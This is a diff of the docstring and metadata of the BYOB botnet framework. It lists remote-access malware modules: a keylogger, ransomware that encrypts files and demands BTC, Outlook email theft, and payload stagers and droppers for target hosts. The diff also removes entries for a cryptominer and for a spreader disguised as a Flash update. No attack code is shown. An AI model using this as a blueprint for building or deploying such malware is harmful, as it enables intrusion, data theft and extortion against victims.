@@ -45,9 +45,11 @@ byob.core
   byob.core.security
     module containing the Diffie-Hellman Internet Key Exchange (RFC 2741)
     method for securing a shared secret key even over insecure networks,
-    as well as encryption & decryption methods for 2 different modes:
-     - AES-256-CBC
-     - XOR-128
+    as well as encryption & decryption methods for 2 different modes to
+    ensure secure communication no matter what
+     - AES-256 in authenticated OCB mode (requires: PyCrypto & pycryptodome)
+     - AES-256 in CBC mode with HMAC-SHA256 authentication (requires: PyCrypto)
+     - XOR-128 (no packages required - uses only builtin python keywords)
 
   byob.core.loader
     enables clients to remotely import any package/module/script from the server
@@ -71,9 +73,6 @@ byob.modules
   remotely import them into the currently running process without writing anything
   to the disk, and use them directly without installation.
 
-  byob.modules.miner
-    run a Bitcoin miner in the background
-
   byob.modules.keylogger
     logs the user’s keystrokes & the window name entered
 
@@ -85,9 +84,6 @@ byob.modules
 
   byob.modules.ransom
     encrypt files & generate random BTC wallet for ransom payment
-
-  byob.modules.icloud
-    check for logged in iCloud account on macOS
 
   byob.modules.outlook
     read/search/upload emails from the local Outlook client
@@ -115,23 +111,21 @@ byob.modules
   byob.modules.process
     list/search/kill/monitor currently running processes on the host
 
-  byob.modules.spreader
-    spread client to other hosts via email disguised as 'Adobe Flash Player Update'
-
   byob.modules.payloads
     package containing the payloads created by client generator that are being
     hosted locally by the server (rather than uploaded to Pastebin to be hosted
     there anonymously) for the client stagers to load & execute on the target
-    host machines
+    host machines 
 
   byob.modules.stagers
     package containing payload stagers created by the client generator along
     with the main payloads, which are hosted locally by the server (rather
     than uploaded to Pastebin to be hosted there anonymously) for the client
-    droppers to load & execute on target host machines"""
+    droppers to load & execute on target host machines
 
+"""
 __all__ = ['client','core','modules','server']
-__version__ = '0.5'
+__version__ = '0.2'
 __license__ = 'GPLv3'
 __author__ = 'Daniel Vega-Myhre'
 __github__ = 'https://github.com/malwaredllc/byob'
